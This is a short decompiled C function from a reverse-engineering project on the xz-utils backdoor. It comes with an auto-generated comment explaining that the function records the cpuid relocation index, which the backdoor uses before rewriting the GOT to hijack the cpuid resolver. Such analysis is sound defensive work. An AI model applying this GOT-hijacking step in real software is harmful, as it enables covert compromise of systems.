// /home/kali/xzre-ghidra/xzregh/103F60_update_cpuid_got_index.c
// Function: update_cpuid_got_index @ 0x103F60
// Calling convention: __stdcall
// Prototype: void __stdcall update_cpuid_got_index(elf_entry_ctx_t * ctx)


/*
 * AutoDoc: Copies the cpuid relocation index from the constant table into `ctx->got_ctx.cpuid_fn`. Backdoor init uses it right before rewriting the GOT so it knows exactly which slot corresponds to the original cpuid resolver.
 */
#include "xzre_types.h"


void update_cpuid_got_index(elf_entry_ctx_t *ctx)

{
  (ctx->got_ctx).cpuid_fn = tls_get_addr_reloc_consts;
  return;
}

